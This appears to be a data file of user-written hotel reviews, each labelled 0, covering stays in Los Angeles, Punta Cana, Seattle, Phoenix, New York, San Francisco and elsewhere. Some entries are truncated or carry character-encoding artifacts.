"very very disappointing. besides the great location, there is nothing else going for the roosevelt hotel. we arrived in the morning to find very rude and unfriendly front desk staff. when i got to my room 503, it was small, smelly, and dark. i had nowhere to put my clothes, so kept them in my suitcase in the cupboard. the cupboard was so dark; i had to take the suitcase out every time to see what i was doing. the tv was on top of the fridge. the furniture was old and chipped.my son had room 502. it was much bigger, had a chest of drawers for clothes plus the fridge. it had a big flat screen tv and it did not smell. i rang the front desk to ask why both rooms are the same rate, yet one is far inferior to the other? i was told, the cost of a queen bed is the same no matter the surroundings.the bathroom s are extremely inconvenient. the tiny scratched shelf above the toilet, and the vertical storage that looks like an old cd unit, were not adequate at all. i had no where to put my toiletries, as that unit isné¥?? big enough to hold bottles upright. i had to close the toilet and use the lid when i wanted to apply my make up or dry my hair. i had to bend down under the basin to find the hair dryer.i was waiting for an envelope to be left for me at the hotel in the afternoon. i asked the desk many times from about 6pm to 9pm, if the envelope had arrived. i was told no. at about 10.30pm i found it underneath my door. please be advised that on enquiry the envelope had been delivered to the roosevelt at 5.30pm!!! it took 5 hours to go up 5 floors. at 1am on the same night, i was woken by room service who asked me what i wanted to order.i had not put in a call or an order to room service.lauren the concerge is very nice, and the food at 25deg. other than that, i will not ever give the roosevelt even a second thought.",0

"amazing place - great service the photos of this place on the ritz website does not do it justice! this is the first time i've been to a hotel where the property was actually much better than the online photos -- just amazing pools and grounds. probably some of the best in the world. the service was also great, but not in your face...the one downside is the beaches are not great -- you have to climb about 400 stairs down a cliff, though it is a beautiful walk and they give you cold towels and water...also, the property is quite affordable - we paid around $200 a night (us) and were then given an opportunity to upgrade to a private condo with a plunge pool for $350 more a night. we did, and for $550 the place is unbelievable with your own private pool and waterfall -- and it is like having your own house because the place is so huge. i would warn you to make sure you get one of the good villas. some are looking over native land where farmers and cows mingle, hurting the privacy - which is the best part of the villa. also, the farmers sometime set fires to burn brush and this can be very annoying. the staff accommo",0

"location is it! all the bad things you read in other reviews are true. there are 3 good things about this hotel - it's location, it's pet policy (allows them) and it's food/in room dining. everything else is relying on the w's from other places to get it customers. there is no housekeeping - no robes, then after they delivered them, they took one away the next day and it never returned. did not service at all one day and left us with no tp! no tissues ever re-appeared in the box. the featherbed was half way down the bed one night (lumpy!) and had to be re-made by me. then the bed was short sheeted the next - i had to remake my bed every night! didn't get fresh towels one day, or floor mat the next, or any bath mats at all the next. it has the noisiest toilets i've ever heard in any accomodations - they really shriek and you have to plug your ears in the all hardscape bath. it is an older building, so guest room and hallway noise are bad, although there is almost no street noise, there is much from the music at the private parties they hold at the pool. they also screwed up my bill, had the name sort of right (not the sex) but the address and the starwood preffered number wrong - i corrected them but still don't have my points. if it wasn't for the location, it would've died by now because it's way to pricey for the lack of service.",0
"just try it! you'll love it! this place is truly amazing! yes, it is a bit out of the way for the seattle hot spots in downtown, but that is what makes it extra special. it is really only a 10 minute drive from all the action. from the moment we arrived, the staff was very nice. we came in very late, but our room was ready and it took less than two minutes to check-in. we had a studio suite and it was spacious, spotless and nicely equipped. the king bed was truly comfortable and our kids (5 and 10) stayed on the sofa sleeper and did not complain once. we had a gorgeous view of mt. rainier out one side. there is also a microwave with a free popcorn package, a coffee maker, and a little refrigerator in your vanity area.the hotel is very secure....front door locked at 10 pm and a room key is needed to access guestroom floors at all times. the free parking garage (yes, free) is also secured pretty well.the evening beer, wine and soda coupled with veggies and snacks was really nice and the breakfast in the morning was worth its weight in gold! scrambled eggs, breakfast meat, cereals, yogurt, bagels, muffins, oatmeal, starbucks coffee and tazo teas...all made for a great start-up meal. just remember to go early. by 9:00 the place was so crowded we were sitting on the couches to eat. not many tables! we went at 8:15 and it was very nice.the hotel also has a mini general store right in the lobby and their mark-up on items was not bad at all. i think they added about $.85 to a $1.90 quiche from the market up the street. it is a great little store with drinks, snacks, microwaveable meals, etc. we also partook of the free washer and dryer on every floor. that was awesome!there isn't all that much around the hotel to walk to with the exception of mamma melena's up the street (excellent italian food in a very relaxed setting with superb service). the neighborhood was a bit scary at first with a few rundown houses and homeless folks, but it wasn't bad at all. there is even a trader joe's market nearby and we got some microwaveable stuff for dinner one night and saved a ton of money. we also tried the portage cafe down at the watertown's sister hotel, university inn, and while the atmosphere was pretty cool, the service was horrible (waitress was rude and apparently at the end of her shift) and the menu was mostly organic/health food so it was different from what we are used to. it was not bad at all, but it wasn't all that great and the prices were a bit high, in my opinion, for a college town eatery. my advice, skip it.the staff at the front desk was always gracious and ready to help in anyway they could. we used the complimentary shuttle downtown to pick-up our rental car and the driver was very kind as well.my only complaints:1) the cart system, while a great idea, was a bust for us. we tried to get the movie cart so we could watch a movie (no dvd players in the rooms) but whoever had the limited number they keep onhand did not return them while we were there so we never got one. they either need to rewrite the policy on the amount of time a cart can be kept by guests or put dvd players in all rooms. we also tried to borrow a movie from the very limited dvd collection only to find that the one we wanted and that they thought they had was not in the case and had likely been stolen. bummer! 2) one elevator of the two was broken during our stay. this made for very long waits to move between the 5 guest room floors, the lobby, and the two levels of the parking garage.3) there are no bellman so you do have to move your own luggage. thankfully, they had two carts sitting by the elevators, but only two.4) there is no real drop off place in front. it is on a one way street and there is no driveway or valet or anything. you just have to pull up and get dropped off. at 10:15 p.m. when we arrived, there was a huge tractor trailer with cars on it so we couldn't even pull up in front!!!i would definitely stay here again if i wanted something a bit less expensive than the giants downtown but clean, comfy, and up-to-",0

"Honest Review!!! I just came back from the EdenH Real Hotel in Punta Cana. I stayed from July 2 to the 6th. I will say that as a pretty frequent traveler and a very open minded person that I was disappointed. I traveled with my husband, brother and his girlfriend. With much anticipation of going on a vacation that was l8 months long over-due we researched quite a bit AFTER we booked through Cheap Carribean, on this Trip Advisor website.

"Dreams PC - Jan 6-13, 2008 for our Wedding! Dreams Punta Cana ReviewJanuary 6 é¥?13, 2008We recently traveled to Dreams Punta Cana with 13 family members and friends for our wedding on January 11, 2008. We flew on US Airways from Chicago O'Hare to Charlotte, NC then to Punta Cana. Our arrival at the Punta Cana airport went very quickly. The plane that landed before us had already cleared customs before we got into the terminal é¥?we all purchased our tourists cards (again having US cash in exact dollar amounts makes this go quickly!) We went thru customs and turned our cards in again about 50 feet from where we originally purchased them. We then proceeded to pick up our luggage and head four our ride to the resort. Since there were so many of us and so much luggage, mostly mine I will admit. We did use the assistance of the 'bell boys'. It really makes it so much easier to get to your bus as you're adjusting to the heat é¥?and it's worth the small (five to ten dollar) tip we gave to them per family/couple! After loading all of our luggage into the trailer attached to the bus é¥?our driver departed! We were on our way to Dreams. Some of the roadway is much nicer than I remembered é¥?I guess it's the completed part of the new highway é¥?however the old roads seem to be much worse than I remember. The pot holes have seemingly doubled or tripled in size! Oh well é¥?just remember to go to the bathroom before you leave the airport! After about an hour é¥?we were at our destination. We did have to travel rather slowly on some roads due to the excessive amounts of water in the potholes from the recent rain. Upon disembarking from the bus trip é¥?we were greeted with cool fruit drinks and directed to the front desk. Upon checking in, everyone's rooms were immediately ready é¥?except ours. We helped our wedding guests find their rooms and by the time we swung back by the lobby our room was ready. We did book a honeymoon suite é¥?and were upgraded to a preferred club honeymoon suite é¥?specifically Suite 6212 é¥?which was fabulous. Words can not do this room justice. They even have a 32 inch LCD flat screen TV in the rooms! The walk-in closet and dual sink vanity was fabulous. Oh and I love the mirrors. Great mirrors for make up, plucking eyebrow's, trying on clothes, etc! Originally, we wanted to downgrade to a swimout é¥?but upon seeing the room we couldn't do it! It was also nice to have the extra room for entertaining our guests and as a central meeting spot (and for my excess luggage!) We immediately unpacked and put together our welcome bags for each couple. Then as our family and friends stopped by we handed the bags out! It worked out quite well! Each welcome pack consisted of a canvas tote bag, sunscreen, tropical smelling body lotion, Imodium AD, Pepto-Bismol, and a personal gift for each person! The first night we all met at the World Cafè for dinner é¥?all the food was delicious! I especially enjoyed the stewed goat é¥?which, quite frankly, I was scared to try! Also, the fresh Mahi-Mahi was delicious! We then proceeded to the lobby to watch a little of the show but found we were tired from the travel so we retired to our rooms early! The next morning we again all met and enjoyed breakfast at the World Cafè and everyone found the omelet bar to be their favorite (again, except me é¥?I dislike eggs of any kind!) But I definitely found plenty of choices é¥?various breads/pastries, French Toast, waffles, pancakes, plenty of bacon and sausage and many fruits. Of course, I also found my favorite é¥?the smoothie bar! I can't get enough of the banana smoothies! And their coffee! It's so much stronger than here in the US but not overpowering! Monday, Tuesday and Wednesday we spent the days lounging around the pool and the beach. On Monday, a gardener came over to us while we were in the pool and cut open a coconut for us - showed us how to drink the coconut milk and eat the coconut - boy what a wonderful treat!! We never tried a restaurant for lunch. We either ordered a late room service breakfast or ate at the grill on the beach. The choices there were great too é¥?hotdogs, hamburgers, pork chops and grilled chicken! I loved the burgers and pork chops é¥?Ian found himself eating the chicken every meal! We did hear a few complaints that there wasn't lunch meat at the grill at the beach é¥?this did not bother us! The World Cafè was open for lunch every day as was either Oceana or Sea Side Grill é¥?but we never felt like getting out of our suits é¥?or even covering our suits up to venture inside to eat! On Monday, we found Grisel and she said we'd get a letter in our room about setting up a meeting for the wedding plans. We didn't ever receive the letter - so we found her again on Tuesday and she gave us a copy of the letter to meet with Julianna on Wednesday at 11a.m. Our full wedding review will be under the wedding section. One thing I'll say is - if you're nervous about the actual ceremony (which honestly, I don't think anyone needs to be) set up your meeting with the wedding coordinator before departing on your trip via email. I think this would have saved a little stress on myself. It also would have made planning excursions earlier in the week more of a possiblity instead of not knowing when we'd be meeting with her. Also, if I were to do it again, I think we would have had the wedding earlier in the week and not waiting so long after arriving. In hindsight, I'd rather have gotten it out of the way right away - but really this wasn't that big of a deal either!!The shows were wonderful é¥?of course é¥?don't expect them to be comparable to Vegas é¥?but they sure do a great job! The entertainment staff is so talented. They really also kept our group involved if they wanted to be é¥?near the pool or the beach! The two 18 year old boys on the trip loved the entertainment staff and participating in games! We especially enjoyed the karaoke night and the musical tribute shows - they were a riot! Also, the piano player in the Rendevous bar was fabulous - although, this show is definitely rated for adults only. It could get a little risque at night. Monday evening we ate at El Patio. The meal was fabulous é¥?everything anyone ordered turned out great! The appetizers were delicious too é¥?especially those darn chips and dips they put out for the first part of the meal! And of course, I have a significant sweet tooth and convinced everyone in our party to make room for the Tres Leches Cake é¥?and it was sure a hit!! Even better than I remembered from our previous trips! Our servers were fantastic! Our drinks were constantly filled before they ran out and we continually had fresh chips, salsa, gaucamole and cheese throughout the meal! Also, the musician trio sang La Bamba to our table during the meal! It was fabulous! Tuesday evening we ate at Seaside Grill. The meal was also good. We found more variety here than at Oceana which was primarily seafood (and a few members of our group weren't seafood fans!) I had the Ribeye é¥?it had a great flavor but I will admit it was quite tough. More tough than I personally enjoy, but still good! Some people in our group really didn't dislike the toughness, perhaps it was just my steak that was on the tough side. The desserts here are also fabulous é¥?we loved the dessert bar at the Seaside Grill. Their was one dessert which we have no clue what it was é¥?that was the best!! It definitely didn't look appetizing but tasted magnificent! It was along the lines of a pie with a flamed meringue on top! The service here did leave something to be desired. Yes, everything was filled fairly quickly and we had everything we asked for - but quite honestly, the server was very reserved and did not seem to be glad to see us. Actually, this was the only staff member that did not appear to be happy about his job while we were there. This of course is not that big of a deal, we all have bad days at work! The musical trio did serenade us again here - this time a much more romantic Dominican song as our family informed them we were there for our wedding! Wednesday evening we ate at Bordeaux é¥?I had the grouper with strawberry sauce é¥?and it was delicious. Ian had the lamb chops and he said they were good but definitely not his favorite food of the trip. He found them to be tougher than he'd normally enjoy. The dessert é¥?again of course é¥?the dessert was wonderful! Our server was an adorable young woman who did a fabulous job and consistantly went out of her way for us! After dinner we realized it was pouring rain, so we sat at the bar outside Bordeaux and enjoyed a few drinks before the rain let up. We did meet the bartender there é¥?who quickly became on of our favorites. We taught him how to make Grasshoppers. He wanted to know what it was called in Spanish é¥?and this took us quite a while to determine but with the help of a picture drawn by one of our wedding guests and some impressions done by us and some Argentinean guests seated near by é¥?we determined this would be called a Satamonte. Which them became our theme word for the rest of the week. This was perhaps one of my favorite nights all week. Part of our group did the sunset horseback ride with Diego on Wednesday afternoon. They did get caught in a short rain shower but said it really added to their experience and it was actually refreshing! Four others in our group did the 4-wheel ride which is sold around around the resort property (much like the horseback ride trip). They said it was also the trip of a lifetime. They were covered head to toe in mud and Misty and Rob's 2 sons (18 years old) had the best time. They too did get caught in the rain but overall said it was a wonderful trip. The rain just added to the fun in the mud! They would reccommend bringing a garbage bag to put these clothes in after the trip - they were just filthy! Thursday six of our wedding guests went on a trip from Apple Vacations to Santo Domingo. They all said it was quite an experience. Personally, Ian and I did not want to spend three hours in a vehicle each way on a beautiful Dominican day! They loved the trip. Came back with some great souviners and gifts. They also had lunch at the Hard Rock Cafe but thought it was only okay. Instead, us and another couple there for our wedding booked a parasailing excursion from the water sports booth by the beach. This was quite the adventure. We were told to be in the lobby at 12: 30p.m. and we would be picked up a few minutes later - actually a few minutes became 1:15p.m. but as we well know it's Dominican Time! We were then taken in a minivan on a 45 minute ride to a resort in Bavaro. From the watersports center on the beach at the resort in Bavaro we were loaded into a boat. Mind you this boat was a maximum of 25 feet long and simply a fiberglass hull with molded seats. It was powered by a 60HP Johnson outboard. We loaded eight people not counting the driver into this boat and headed to another boat further away from shore. This was a bumpy ride and we did get soaked. If you do this excursion, I'd recommend keeping your camera in a water resistant bag and taking towels! Upon arriving at the other boat, we pulled up next to it. The driver hung onto the side of the other vessel and we climbed into the parasailing boat as others climbed into our boat. The climbing from one boat to another was definitely interesting and a little physical! We then took seats around the bow of the parasailing boat and watched a couple go up in the air! The parasailing was $100 per couple and your parasailed tandem. The little taxi boat picked people up from our boat as soon as their parasailed and then dropped new people off for their turn. The operators put a harness on you and with very little instruction get you situation to go up in the air! I was quite nervous before taking off - but quickly realized it was the most enjoyable experiences I've ever had. You slowly float up into the air, I was expecting jerky movements but it really was almost like flying. We could see for miles around us. Including over a number of Bavaro resorts and the ship that has sunk off the beach there! WOW - What a site! It was the most relaxing and peaceful experience. Perfect for Ian and myself. As peacefully as we had gone up in the air we came back down to the boat. We then disembarked from the boat and were loaded into the taxi boat again and back to the beach we went. We returned to Dreams at about 4: 45p.m. This definitely was an experience of a lifetime. Thursday night, Ian, myself, and our friends Misty and Pat (yes, my two best friends are both named Misty and both came on the trip with us) went to the World Cafe for dinner. Again, an excellent meal with a lot of variety! There were again a variety of breads, pasta dishes, vegetable dishes and meat dishes - both American-Style and more authentic local style! Friday, the morning of the wedding - we decided to do the Zip-Line excursion from Apple Vacations. The cost was $89 per person. This trip does book up rather quickly and we did have to book it a few days in advance! Eight of us did this trip. We were picked up in an open air truck and were driven up to the mountains. On the way up the mountain, we did experience a little catastrophe! While approaching a curve that did have a 'sharp curve' sign on the side of the road, about twenty feet in front of us - we saw a gasoline truck taking the corner way to fast - the truck proceeded to jack-knife and began to roll. It almost took out a house in the process but skidded to a stop just in time. Our driver did a fantastic job avoiding the accident. At one point, we could have stuck our hand out and touched the truck! As we got passed the accident - the tanker started spewing gasoline like a fountain and it was creating a stream down the road. It looked like something you'd see at Universal Studios or in a movie. At first our driver was going to stop - as we had a paramedica and doctor on board - but then he decided to take off as the gasoline started to reach our truck. Any spark or excessive heat could have ignited a massive explosion. For the rest of the ride, after seeing this tragic accident, we were all on edge. We all hung on for dear life - but really had more feer for the ride than the zip line. We then proceeded to go up a steep rugged terrain to get to the zip line location. This was very nervewracking after the accident we had witnessed. When we arrive at the zip line - we did find out the driver of the semi did make it out alive - which helped us all to relax. The zip line has 10 zip lines spread through 11 platforms. The range from 65 meters in length to 250 meters in length. To be honest, I panicked for the first four, but caught back up on the 5th zip line. After completing the longest 6 zip lines - I wish I had done the first four! It too was a once in a lifetime experience. I would reccomend it to anyone. And for myself, if I had be the last to go, I would have done much better than one of the first. Having someone say it's not as bad as it looks, or just do it -- doesn't help the situation. If you're scared your scared! But really, you're so securely in there - and the instructions for this excursion our FABULOUS!! I would definitely do this excursion again - and really I think anyone can do it - as long as you can overcome any of your own fears. It isn't too physically demanding and is completely rewarding! Upon completing the zip lines - we were given wonderful chocolate, fruit, coffee, soda and water! We then boarded the truck for the trip back to the resort. It is about a 45 minute ride to the location of the zip lines. The ride is on pretty smooth roads other than the trip up the mountain. On the way back, we were able to see them 'cleaning' up the accident. It's amazing, people were standing around near a gasoline spill trying to collect gasoline for their vehicles. Here in the US that roadway would have been closed for hours upon hours! We did make it back to the resort by 1p.m. (We left the resort at 8:45a.m.) We then grabbed a quick lunch in the World Cafe and I headed to my hair appointment for the wedding. The wedding was at 4p.m. and everything worked out perfectly. (Details are in our review in the wedding section!) We didn't hire the photographer from the resort - and I think our pictures turned out beautifully - which I also should have up to share now that weekend is approaching! We did not have a private reception (again details are in our review in the wedding section) and it turned out fabulous! After the wedding  reception we got back to our room - and it was decorated beautifully - a honeymooner banner on the door, candles and flowers leading up to our bed, a sheet-art wedding dress drapped over the bed with beautiful flowers everywhere. Then Ian's parents had brought a talking monkey and a card for us which Grisel had placed on our bed. And MM's with our name and wedding ",0

"neat experience! my husband and i stayed here for 2 nights this summer while on a long vacation in california. i was quite suprised by the other comments!! we had a really nice time here--it is definitely a different type of hotel! if you want to experience hollywood--you will get the full effects of it here! definitely go to the pool if you want to see celebs and other crazy hollywood types--we were lucky to actually spot a few!! our room was fine, we dined at the steakhouse there, now called dakota and were very pleased with the food and service. the front desk staff were pleasant with us as well. the only thing negative about the hotel was having to valet park your car and it is a whole process to get your car back out! i recommend just having them park it when you get there and leaving it and just walk places if you can!! i think this hotel might be better suited for younger crowds and couples. not much of a family hotel atmosphere, but overall, we were pleased.",0

"very very very nice resort price - very good compared to other resorts.airport transfer - sure roads weren't the best, however our driver was excellent. very enjoyable drive to the resort. buddy will try to sell you a beer for $5.00, i suggest you wait until you get to the resort, where it is free...check in - very smooth and accomodating. hint get your safe key upon check in. you will have to pay a $3.00 per day rental and a $50.00 deposit. totaling $71.00 per 7 days. put it on a credit card to save your cash.room - nice, nothing fancy , clean comfortable and a good size. we had ocean view. building m 105 on the tropical side. beware of the shower head. make sure it is pointed to the tub before you turn it on. if you have a small cheap clock radio bring it, there are none in the rooms. we passed ours on to a couple from england who were there for the next couple of weeks. have a small ext cord if you need to charge cameras, phones, laptops etc.. the wall plugs are built in such a way that the large plug ins don't fit. regular cords do. beach - great. i've been to a few resorts and this was the best for finding a spot on the beach. a good number of huts , most are low to the ground. tons of loungers... more than enough. i really can't see why some people complain. i suggest you make yourself happy, don't waste your time worrying about other people hoarding chairs etc.. make the most your 7 days... to the north (left) is the excellence resort 15 minutes walk. to the south (right) is the dreams and colony bay resorts 45 min walk. food - everywhere... not the best of the best but i can't see how you can lose weight after 7 days. we were pleased with the selections. for the a-la-cartes we did them all. oriental jade great for the entertainment value alone. i had a suprisingly great steak at the steak house, mexicn food was good, seafood was good, italian was very nice, i even enjoyed the vegetarian. there are three areas to book your a-la-cartes, we never had to wait that long. book the jade first... you can book up to three days in advance. if you are with another couple, book one rest for 4 people under one room then another rest for 4 people under the other room...bars - all over the place. but i think the last free drinks are at 01:00 am. if you are gambling in the casino the drinks are free, it may be open until 03:00, and the disco is open until 2:00 am i think, but you pay for your drinks there. hardly ever much of a line up if any to get a drink. resort - nice and secluded away from the main cluster as they are down on the bavaro beach. sometimes you have to pay extra for excursions because of the extra travel time. no time share people (promoters) here ... yahoo !!!!!! ... we spent two weeks at the occidental grand flamenco resort in punta cana in february of this year and they were a pain in the butt.. very relaxing walk to and from the main buffets without being hounded to attend presentations etc...entertainment - similar to other resorts. we went most nights. tips - at the airports or with the hotel bellboy, as a rule $1 per suitcase. we tiped $1 for most breakfast and lunches. more at the a-la-cartes $3 to $6. the bar staff we would tip $1 every third trip to the bar or $1 to the girls waitressing. don't forget the pool bar staff , hard for them to get tips as most people only have baithing suits on when drinking in the pool. overall - lots of very friendly staff - a good number of english speaking staff. avoid the shops out in front of the resort main entrance. dicker with any vendor. we were able to make most purchases for approx 25% of the original price. the twin brothers raoul and paul next to the resort have good atv trip prices. not may sand fleasbring items for the gardners, they wear green shirts and pants. the maids are dragging bags of gifts they receive everyday, so i suggest you share with the gardners. i brought pliers, emergency candle packs, insulated mugs, etc.. any type of tool would be appreciated, they have families too. i was always bringing them a bottle of water. i suggest you print off some notes saying this is a gift to you from mr and mrs smith room tropical m 105 and",0

"so so expected more i'll begin with the positives--very friendly housekeeping staff; nice waiter at the downstairs restaurant and good food too; helpful bell man; and very beautiful lobby and gardens. now with the negatives--the lobby was beautiful as stated before, so it was a complete shock to find a room that had a stale smell with carpets that were stained all over and the beds were not comfortable. there was a large group (25+) of 18-21 year olds staying there on saturday night who were extremely rude and beligerant; i felt unsafe with them around, but the staff seemed unconcerned about the profanity there were loudly speaking throughout the lobby and garage. i was traveling with my 15 y.o. niece on a road trip from san jose area, and we ended up leaving a day early even though i had prepaid for the night. the front desk staff were indifferent as to why we were leaving a day early. i would not recommend this hotel to anyone staying in the area except to say to check out the gardens and lobby during the day when it's quiet and safe.",0

"great value! my stay was this past weekend for three nights, getting a great deal of $51 a night on priceline. the hotel has been well maintained, since my last stay several years ago. my check in was quick and the front desk staff was very helpful. i did not use very many of the hotel amenities, since most of my time was spent in central phoenix. i liked the hotel's location between two expressways that connected to the metro phoenix freeway system. the room was quiet, considering the close proximity to the airport and the major freeways. my one complaint is that there was the odor of exhaust fumes in the lobby and the upper floor hallways. i would suspect that they use a gas-powered machine to clean the floors in the main lobby. to be fair, others in my party could not detect the smell in their lower floor rooms.the kiosk by the front desk allows you to quickly check in as well as to print boarding passes is a great addition. i enjoyed my stay and will return to this hotel.",0

"beautiful lobby/so/so rooms i agree with most of the other reviews. the lobby areas are absolutely beautiful--felt like i was in a fine art museum. even the ceilings are magnificent. i also liked the historical nature of the hotel--with pictures of the original academy awards banquets held here. the back lobby near the restaurants is a quiet and elegant place to have coffee or a light breakfast from the coffee bar located there.we were there on the weekend and found the area to be quiet, safe and clean. we walked to the moma and disney concert hall easily and quickly.now, the rooms are as described, although ours may have been better than some. it was very large and clean, but there was a large empty area near the doorway which could have benefited from a sofa or easy chairs. it was simply empty. also, the towels in the bathroom were thin and hard--that would be easy enough to fix despite the historic nature of the hotel. there was a large stain on one bedspread and the desk was badly peeling paint with a piece of glass over it. a simple paint job would take care of that.i probably would stay there again due to location and beauty of the public areas, but would ask if there are any recently renovated rooms.",0

"built in a diverse neighborhood i come to phoenix since i have family there and i have stayed at this resort with a friend who was offered a free stay. the resort consists of timeshares and owner-occupied townhouses. the timeshares are in one area and the townhouses in another. we stayed in a 1st level one room suite. it had all the amenities we needed. the decoration is nice, including the tile floors. we were not hassled to attend a presentation. the onsite restaurant is very small. the pool is off to itself, which i like. the area is not a ghetto as a reviewer previously wrote. it is a very diverse area with different cultures. the resort is tucked away off the main street (baseline) and is in a residential area with older ranch homes on acres of lands (horses across the way) and new home developments. the grocery store, frys marketplace, is a new plaza less than 5 minutes away. it includes a target, ross, starbucks, blockbuster. the resort is less than 10 minutes ways from south mountain park where me and my friend did some hiking. you can also take the car to one of the looking points and see the city lights. there is also a horseriding stable at the south mountain park if you want to do a little riding. so if you are use to only seeing one type of people, then this is not the place for you. you will be frighten and scared for no reason like the previous reviewer. but if you are use to living in a multicultural area, it won't bother you at all.",0

"i don't think so! i'm tired just thinking about our stay at the sheraton this past weekend. slept awful, the bed was on the nicer side, but there was a problem with our room, a high-pitched whine was coming from the temp console that made you feel like you had a really, really bad inner ear problem. the engineers who came were pleasant but couldn't fix the problem. the hotel was booked solid and we couldn't be moved to another room, which is unfortunate, but understandable. the three of us slept, such as we could, with pillows sandwiched between our ears. other complaints: the tub drained super slow, what i would expect from motel 6, not the sheraton. the toilet handle had a tendency to get stuck. and, we could hear every noise from the adjacent rooms, and the sound of running down the hallway the floor above, well past midnight. you can hear everything! thin walls, who are these tripadvisors saying the rooms are soundproof, they are so not!upon checkout the next morning, we told the front desk about our wretched night's sleep and she said sorry and reassured us they would look into it, which you know, that isn't the point, that the next people in the room the following night are going to sleep fine, bewildering response.---we wanted compensation for staying in the night in a room that was not of the same quality as the other rooms, surely you should not have to pay full price! she was not rude, but she wasn't very warm or helpful either. we finally spoke to the manager, who in the end, gave us a free room in the form of equivalent number of starwood points, for the next time we stay at a sheraton, but it will not be the sheraton gateway. one huge benefit was the next morning, when we awoke and were megagroggy, asking my boyfriend for an extra large cup of very strong coffee, and he promptly went down to the starbucks in the lobby and brought it back to the hotel room. so if you have no choice but to stay here and don't sleep well, there's always caffeine to get you through the next day.",0
"Great Week at Edenh We stayed at EdenH the first week of March and had a great time. Reading some of the negative reviews has been amusing because we heard some of the same complaints loudly expressed while we were there - - probably by the same people who wrote the bad reviews. You'd think that demanding people would relax a little when they're on vacation, but that doesn't seem to be the case. EdenH was our choice because of the exceptional rates. Everyone knew this was a newly-opened resort which means there are still problems to work out. We saw a few mosquitoes in our room but just got rid of them. One lady was freaking out because there was a mosquito in her room. This is a tropical climate, right? Has she never had a mosquito in her house?We were green bracelet people and were glad we didn't upgrade to pink, after talking with the pink people. If you want expensive liquor and your own private bar, then go for the pink.There were only two problems that we saw. We didn't get up at 5:30 a.m. to get chairs. We just used beach towels and got chairs as they became available. The problem is the guests who go out early and reserve both beach and pool-side chairs. As the couple we traveled with said, A reserved chair has a body on it. If the resort gets 3,000 chairs to accomo",0

"got what we paid for but great breakfast enjoy your breakfast and the thought that you are saving money -- but that is about it.we stayed just overnight and this is the duration that i recommend to everyone. first, if you are from outside u.s., make sure you print out the sheet (ie. travelocity or expedia page) showing that you get free parking. we had a dispute with the front desk who said they do not give free parking but if we could prove it, they would be more than happy to accommodate. we had to use their internet (free luckily) to print out the page and show to them.second, bedding linens were worn out and must have been from the 70s but were clean. checked for roaches, etc but none so i guess they earned their 2 stars. carpet is threadbare. you get a fuzzy tv with full cable and a reasonable sized fridge (no alcohol) and microwave. we were offput by the dispensing machines in the bathroom where you pressed buttons to get shampoo and soap. how cheap is that?construction in the neighborhood begins at 7am sharp where we were woken by jackhammer drill early in the morning.breakfast was excellent in a huge breakfast room and includes yogourt, waffles (you make your own), pastries, fruit, cereal, milk, hard boiled eggs, toast, bagels. we were disgruntled by our room but the free breakfast somewhat made us feel better.elevator is sometimes slow. cleaning staff don't say hello or smile, i guess don't care about guests considering this is 2 star hotel. take the stairs if you can.location is central, although seems area is kind of seedy if not dead. lots of car lots around. you can walk to downtown within 10 minutes. they leave a card on your bed warning you to be cautious about safety in this area and maybe it is warranted.we enjoyed phantom of the opera while we were there. parking is close but expensive and around $20 for events.get what you pay for.",0
"wow, what a fantastic hotel we stayed at the afinia in late june and were lucky enough to have a corner room on the 34th floor with views of the east river and the chrysler building. we often use trip advisor to help choose a hotel and i think the reviews here are fair. the hotel itself is good, the rooms are big, the beds are comfy and it is useful to have a kitchen area if not just for the huge fridge. the real reason to stay here is the location, it is great. a couple of blocks further up 34th and you start entering the hustle and bustle of the city, however it is relatively calm in the hotels district. there are countless restaurants and bars all within walking distance and having a duane reed across the street helps. we ate at the barking dog, once for breakfast and once in the eve. the breakfast was ok however the evening meal was not up to much. beware if you sit outside as water drips off the top of the building even if it isné¥?? raining and the staff seemed adamant that the customers were crazy! with all of the choice just outside the hotel the barking dog should really be given a miss é¥?go to penelopeé¥??? instead if you want the freshest and tastiest food for both breakfast and dinner! some people have commented on noise, and yes there are a few ambulances in particular because of the two big hospitals that are just down the road. all i can say is that if you think this is noisy go stay in a central hotel and then compare it!all in all the hotel itself is very nice, the staff very helpful and yes the room is a little",0

old fashioned but very nice.. my wife and i stayed here for 4 nights on our honeymoon before flying off to hawaii. we found the hotel to be in the best possible location. for this alone i would have paid a bit more!!on arrival we were met at our limousine and escorted to the check in desk. the check in process was very nice and pleasant even after a 10hr flight. the desk staff were very polite and helpful. they all provided as much information as to what was available around and about the hotel and also advised on best modes of transport around the area. excellent. the room decor was a bit dated but as you enter the hotel you kind of expect to be met with a room that befits the rest of the decor. not surprised by this and not at all let down. we did not use the restaurant therefore we cannot comment on this but from the aromas coming from the general area of the restaurant we certainly should have. we did however utilise room service which arrived very quickly and was well presented.what i liked most about this hotel is the staff never once stood and waited for me to pass on gratuities. they were very quick to make an exit after carrying out their duties which i liked but still we never let them leave without passing a tip which always seemed to be taken with surprise and lots of thanks. nice to see that some folk still appreciate it and don't just expect it...,0

"wonderful value we stayed for two nights at this hotel, and the location was fantastic for universal studios, to where the free hotel shuttle runs regularly. we had an enormous room with panoramic views of universal, and a large bathroom, both of which were very clean and modern. the staff were very helpful. the hotel seemed to be used equally by people on holiday, and on business, and this was reflected in the price of the restaurant, but there are many places to eat in univeral city walk.the biggest plus point for us was the universal studios package on offer, which included the cost of two tickets to universal studios and the room rate. this deal saved us 40 dollars off the cost of 2 tickets bought at the universal ticket office, and those tickets would have been for one day, whereas ours from the hotel were for 2 days. definitely worth buying. we had a great time here.",0

"ok but rooms look tired... my partner and i stayed at the renaissance stanford court hotel on the labor day weekend 3-6 september 2004. we arrived at 9:30pm after a long flight from australia.on check-in, we were greeted by a very helpful clerk who said that the hotel was extremely full due to the labor day weekend. that meant that our preference of king bed and non-smoking room could not be met, which was frustrating seeing we had requested this when booking six weeks earlier. we eventually settled on the smoking room with the king bed, which the clerk assured us was one of the bigger rooms.i can say that we were disappointed on entering the room. whilst the smoke smell was not too bad (2 non smokers), the general quality of the room looked tired and old. the canopy over the top of the bed was broken, and our hairdryer didn't work and needed replacement. we tried to use the in-room internet via the television, and after 2 minutes use found that it did not support google's gmail. we had to ring and request the charge be removed from our account, and also found out that general internet would then be $2.50 for five minutes in the business centre, which we found to be very expensive.we drank in the bar after returning from dinner on the saturday night, and after one drink we were told the bar was closing (12:45am) despite advertising that it was opened until 2am. we were really trying to support the services of the hotel but felt let down.the location atop nob hill is excellent, however the cable cars were so full that we walked a few times up and down the hills. good exercise!overall, a stately hotel in its time, however the renaissance stanford court really needs to lift its game if seriously aiming for the business travel and high end leisure market. if the rooms were refurbished and the 